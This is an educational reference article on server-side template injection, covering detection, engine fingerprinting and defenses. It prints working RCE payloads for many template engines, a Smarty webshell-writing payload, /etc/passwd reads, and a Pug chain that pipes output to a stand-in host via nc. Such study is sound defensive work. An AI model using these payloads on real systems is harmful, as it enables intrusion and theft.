# Server-Side Template Injection (SSTI)

> A template engine combines a fixed template with volatile data to produce output. SSTI happens when user input lands in the template string itself instead of being passed in as a data value, so the attacker's input is parsed and evaluated as template code with access to the engine's object model. Because that evaluation runs server-side, the impact is not a client-side script but native code execution in the engine's language: from a reachable object you walk the language's reflection/object graph to the runtime and reach OS command execution. Root cause is code/data confusion at the template layer, the exact analogue of SQL injection in a badly built prepared statement. This was first documented by James Kettle (PortSwigger) in the 2015 paper "Server-Side Template Injection: RCE for the Modern Web App."

## How it works

Template engines are designed so developers write a static template with placeholders and pass data in separately:

```php
// Safe: name is DATA passed into a fixed template
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name));
```

The vulnerability appears when the input is concatenated into the template that is then compiled and evaluated:

```php
// Vulnerable: user input becomes part of the TEMPLATE
$output = $twig->render("Dear " . $_GET['name']);
```

Now `?name={{7*7}}` is not displayed literally; the engine parses `{{7*7}}` as an expression and evaluates it. The reason this is so dangerous is that a template engine is effectively a server-side interpreter: expressions can reference objects, call methods, and (in most engines) reach the host language runtime. Kettle frames a template engine as a "server-side sandbox," and SSTI is the act of escaping that sandbox.

Two contexts, each detected differently:

- Plaintext context: input is placed in the free-text body, for example `render('Hello ' + username)`. Injecting `${7*7}` yields `Hello 49`. This is frequently mistaken for plain XSS, but the math evaluating server-side is the tell.
- Code context: input is placed inside an existing template expression, for example `engine.render("Hello {{" + greeting + "}}", data)`. There is no XSS cue. Detect by first confirming there is no direct XSS (`greeting=x<tag>` gets encoded/blanked), then breaking out of the expression: `greeting=x}}<tag>`. If the `<tag>` now renders, you have escaped into template context.

## Attack techniques

The universal pattern is: from any reachable object, reflect through the language's type/object graph to the runtime or OS bridge, then execute. You do not memorize payloads; you understand which edges each engine exposes. The steps are: detect, fingerprint the engine, read its docs (built-ins, security notes, known exploits), explore the environment (find a `self`/namespace object or brute-force variable names), then build the chain.

### 1. Detect and fingerprint the engine (decision tree)

Fuzz with a polyglot of template metacharacters and watch for errors or evaluation:

```
${{<%[%'"}}%\
```

An exception implies the syntax is being interpreted. Then discriminate engines with math and string probes, because the escape path is engine-specific:

- `{{7*7}}` evaluates to `49` in Jinja2 and Twig (uses `{{ }}`).
- `${7*7}` evaluates to `49` in Freemarker and JSP/Spring EL (uses `${ }`).
- `#{7*7}` is used by some engines (Ruby string interpolation, older frameworks).
- `{{7*'7'}}` is the key discriminator: `49` in Twig (numeric coercion) versus `7777777` in Jinja2 (Python string repetition). One payload separates the two most common `{{ }}` engines.
- `<%= 7*7 %>` evaluates to `49` in ERB (Ruby).
- `{7*7}` evaluates to `49` in Smarty (single braces).

Do not conclude from a single response, since payloads overlap across engines. Fastest confirmation of all: submit invalid syntax and read the error, which often names the engine and version outright. For example `<%=foobar%>` against ERB returns:

```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
```

### 2. Jinja2 / Python (object-graph walk)

Sandbox-free confirmation via config leak, then climb the object graph to RCE:

```jinja
{{ config }}                     {# leaks Flask config incl. SECRET_KEY #}
{{ self }}                       {# namespace object #}

{# Classic MRO climb to a subclass that runs commands: #}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}

{# Reach builtins via __globals__ and import os: #}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}
```

Why it works: from any object you reach `__class__`, then `__mro__`/`__bases__` up to `object`, then `__subclasses__()` enumerates every loaded class, some of which (`subprocess.Popen`, file objects, warning-category importers) run commands or import modules. Alternatively `__globals__`/`__builtins__` on a bound function gives `os`/`import`. `SandboxedEnvironment` blocks dunder access; bypasses target attributes or filters the sandbox forgot to fence (for example via `|attr()`, `request`, or unblocked callables). If Mako is the engine, it is trivial because Mako allows inline Python:

```mako
<% import os; x = os.popen('id').read() %>${x}
```

### 3. Twig / PHP

Unsandboxed Twig, register a PHP callable as a filter and invoke it (from Kettle's research):

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Why it works: `_self.env` is the `Twig_Environment`; `registerUndefinedFilterCallback` plus `getFilter` reach `call_user_func`, turning any PHP function into a filter. Older Twig also allowed `setCache("ftp://attacker/")` + `loadTemplate(...)` for RFI, but modern PHP disables remote include. Sandboxed Twig bypass: the sandbox whitelists methods, but `checkMethodAllowed` returns true for objects implementing `Twig_TemplateInterface` (which `_self` does), so `displayBlock` becomes a gadget to call arbitrary methods on reachable objects:

```twig
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```

The sandbox escape was fixed in Twig 1.20.0. Simpler modern probes use `filter`/`map`/`sort` with a callback (`{{['id']|filter('system')}}`).

### 4. Freemarker / Java

Direct command execution via the `?new()` built-in and the `Execute` utility (from Kettle's research):

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

Why it works: `?new()` instantiates classes implementing `TemplateModel`, and Freemarker ships `freemarker.template.utility.Execute`, which forks a process and inlines its stdout. Even for classes that do not implement `TemplateModel`, `?new()` triggers their static initializer. The vendor defense is a `TemplateClassResolver` (for example `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`) that restricts which classes `?new()` can reach. Other Java gadgets: `${T(java.lang.System).getenv()}` (Spring EL) to dump environment/scope.

### 5. Velocity / Java

Chain the `ClassTool` reflection helper to `Runtime.exec` (from Kettle's research):

```velocity
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

## Read the command output back:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Why it works: `$class.inspect(...).type` returns a live `Class` reference, from which `getRuntime().exec()` runs commands. Where `$class` is not exposed (for example XWiki's sandbox), you fall back to developer-supplied objects: XWiki's `$doc.save`/`saveAsAuthor` privilege confusion let a low-privilege page backdoor itself when an admin views it, escalating to unsandboxed Groovy/Python.

### 6. ERB / Ruby

ERB is designed to run Ruby, so execution is immediate:

```erb
<%= system('id') %>
<%= `id` %>
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
```

Why it works: `<%= %>` evaluates arbitrary Ruby and inlines the result; there is no sandbox to escape in stock ERB.

### 7. Node engines (Handlebars, Pug/Jade, EJS)

Walk from a global object to `child_process`. Kettle's Jade (Pug) chain:

```pug
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

EJS and Pug allow inline JavaScript directly. Handlebars is logic-less, so exploitation walks the prototype/constructor chain to reach `require`:

```handlebars
{{#with "s" as |string|}}
  {{#with string.constructor}}
    {{#with (string.constructor.constructor "return process")()}}
      {{this.mainModule.require('child_process').execSync('id')}}
    {{/with}}
  {{/with}}
{{/with}}
```

Why it works: even a logic-less engine exposes object constructors; `constructor.constructor` reaches `Function`, which builds a function returning `process`, from which `process.mainModule.require('child_process')` gives command execution.

### 8. Smarty / PHP

Unsandboxed Smarty runs PHP directly:

```smarty
{php}echo `id`;{/php}
{system('id')}
```

Secure-mode bypass (from Kettle's research) uses static classes the whitelist forgot: `self::getStreamVariable` reads files, and `Smarty_Internal_Write_File::writeFile(...)` plus `self::clearConfig()` (which returns a Smarty instance to satisfy the type hint) writes a webshell:

```smarty
{self::getStreamVariable("file:///etc/passwd")}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

Fixed in Smarty 3.1.24.

### 9. Blind SSTI

When output is not reflected, confirm and exploit blindly:

- Before you have execution, trigger engine-specific errors that visibly change the response to fingerprint.
- After you have execution, use the same tricks as blind command injection: time delays (`exec("sleep 10")`, Velocity `Runtime.exec("sleep 5").waitFor()`) and out-of-band callbacks (make the server perform a DNS/HTTP request to you, or `nc`/`curl` exfil).

## Impact ladder

Config/secret disclosure (`{{config}}`, env dump) to arbitrary file read/write to remote code execution (the usual endpoint) to internal network access (SSRF from the compromised server) to full compromise and lateral movement. Even when RCE is blocked by a sandbox, SSTI commonly still yields file path traversal and sensitive data disclosure through developer-supplied objects. SSTI almost always escalates to RCE, which is why it is rated critical.

## Defense

Ordered by effectiveness. The real fix is data/code separation; sandboxing is defense in depth.

1. Never build templates from user input. Pass user data as context/variables into a static, developer-authored template, the same separation as parameterized SQL: `render(template_file, name=user_input)`, never `render(fixed_string + user_input)`. This removes the vulnerability class.
2. If users must supply templates (wikis, CMS, marketing/email builders, reporting), prefer a logic-less engine (Mustache) or one with minimal expressive power (Python's `string.Template`). Separating logic from presentation shrinks the dangerous surface dramatically.
3. If you must run user templates in a full engine, use a sandboxed mode with a strict allowlist of exposed variables/filters, and treat the sandbox as a hardening layer, not a guarantee: every major engine has had sandbox-escape CVEs (Twig sandbox fixed in 1.20.0, Smarty secure mode fixed in 3.1.24). Keep engines patched.
4. Concede that a sandbox escape may happen and contain the blast radius: run rendering in a locked-down Docker container with dropped capabilities, a read-only filesystem, no outbound network, and least privilege, so an escape does not become full RCE plus exfil. MediaWiki's approach (a stripped Lua sandbox) is a cited example that has held up.
5. Contextual output encoding still matters for the XSS surface but does NOT stop server-side evaluation. Do not confuse the two: encoding the output does nothing about `{{7*7}}` being computed on the server.

Detection (defensive review): grep for template APIs that receive a dynamic/concatenated template string rather than a fixed template file plus data: `render_template_string`, `env.from_string`, `Template(user_input)`, `new Template(...)`, string concatenation into `render()`, plus any feature that lets users author templates (email customization, notification templates, WYSIWYG "expression" fields, report builders). User-supplied templates are the highest-risk feature.

## Interview-grade nuances

- SSTI vs XSS is the classic trap. In the plaintext context SSTI often also produces XSS, and juniors stop at "reflected XSS." The senior move is to send `{{7*7}}`/`${7*7}`: server-side evaluation (math with no browser) proves SSTI, which is usually RCE, not just XSS.
- Code context is the easy-to-miss one: no XSS cue, looks like a hashmap lookup. Detect by confirming no direct XSS, then breaking out with `}}` (or the engine's terminator) and injecting after it.
- "We HTML-encode the output" is a wrong answer. Encoding addresses XSS, not evaluation. The fix is not concatenating input into the template at all.
- `{{7*'7'}}` returning `7777777` vs `49` (Jinja2 vs Twig) is the single best fingerprint to cite; and note that one probe can succeed in multiple engines, so never conclude from one response.
- Sandboxes are not a security boundary you can trust. Kettle's paper explicitly escapes sandboxes whose entire purpose is safe user templates (Twig sandbox via `checkMethodAllowed`/`displayBlock`, Smarty secure mode via static classes). The staff-level framing: a sandbox cuts specific edges in the object graph, and bypasses find an edge it forgot to cut. Treat it as defense in depth behind a container.
- Intentional vs accidental: SSTI arises both by developer mistake (concatenation) and by design (features that let privileged users edit templates in wikis/CMS/marketing tools). The intentional case is why sandboxed modes exist and why they keep getting broken.
- SSTI can arrive out-of-band. Kettle notes it can appear as an LFI-to-RCE variant (template code embedded in log files, session files, `/proc/self/environ`), so the injection point is not always an obvious request parameter.
- "Server-side" is a deliberate qualifier: client-side template injection (AngularJS, Vue, Handlebars in the browser) is an XSS-class problem. This document is about achieving code execution on the server.
- Unsandboxed engines are trivially RCE (Smarty `{php}`, Mako `<% %>`, ERB `<%= %>`, Freemarker `?new()`), so identifying the engine is often the whole exploit; the hard work is only when a sandbox is present.

## Sources

- PortSwigger Web Security Academy, Server-side template injection: https://portswigger.net/web-security/server-side-template-injection
- PortSwigger Web Security Academy, Exploiting SSTI: https://portswigger.net/web-security/server-side-template-injection/exploiting
- James Kettle (PortSwigger Research), Server-Side Template Injection: RCE for the Modern Web App: https://portswigger.net/research/server-side-template-injection
